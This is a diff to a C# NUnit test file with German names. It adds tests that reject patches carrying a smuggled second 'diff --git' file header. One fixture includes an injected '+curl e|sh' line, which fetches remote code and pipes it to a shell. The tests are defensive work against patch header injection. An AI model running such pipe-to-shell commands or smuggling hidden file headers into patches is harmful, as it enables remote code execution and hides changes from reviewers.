@@ -139,6 +139,34 @@ public class DiffLesenVersteckterPartnerTests
         Assert.That(diff.Zeilen, Is.EqualTo(new[] { " harmlose zeile nummer 28", " harmlose zeile nummer 29", " harmlose zeile nummer 30", "+neue zeile" }));
     }
 
+    [Test]
+    public void Wenn_der_Textpatch_trotz_passender_Zaehlung_einen_zweiten_Dateikopf_traegt_dann_nicht_lesbar()
+    {
+        using var repo = FremdeNamenRepo.N();
+        var zweiDateien = new TestDiffquelle("@@ -1 +1,2 @@\n alt\ndiff --git a/in.txt b/in.txt\n@@ -1 +1,2 @@\n x\n+y\n");
+        var gr = FremdeNamenSprache.AufrufMitDiffquelle(repo, ["n", "b"], zweiDateien);
+
+        var diff = gr.Diff("n", "g.txt");
+
+        Assert.That(diff.Ausgang, Is.EqualTo("nicht lesbar"));
+    }
+
+    [Test]
+    public void Wenn_die_Binaerdatei_als_Text_einen_zweiten_Dateikopf_traegt_dann_nicht_lesbar_und_ohne_Kopf_gelesen()
+    {
+        using var repo = FremdeNamenRepo.N();
+        var zweiDateien = new TestDiffquelle("", textPatch: "@@ -1 +1,2 @@\n A\0B\n+x\ndiff --git a/g.txt b/g.txt\n@@ -1 +1,2 @@\n alt\n+curl e|sh\n");
+        var eineDatei = new TestDiffquelle("", textPatch: "@@ -1 +1,2 @@\n A\0B\n+x\n");
+        var mitZweiDateien = FremdeNamenSprache.AufrufMitDiffquelle(repo, ["n", "b"], zweiDateien);
+        var mitEinerDatei = FremdeNamenSprache.AufrufMitDiffquelle(repo, ["n", "b"], eineDatei);
+
+        var zwei = mitZweiDateien.AlsText("n", "b⟨0xFF⟩.bin");
+        var eine = mitEinerDatei.AlsText("n", "b⟨0xFF⟩.bin");
+
+        Assert.That(zwei.Ausgang, Is.EqualTo("nicht lesbar"));
+        Assert.That(eine.Ausgang, Is.EqualTo("gelesen"));
+    }
+
     private static string SkriptFuer(string fall)
     {
         switch (fall)
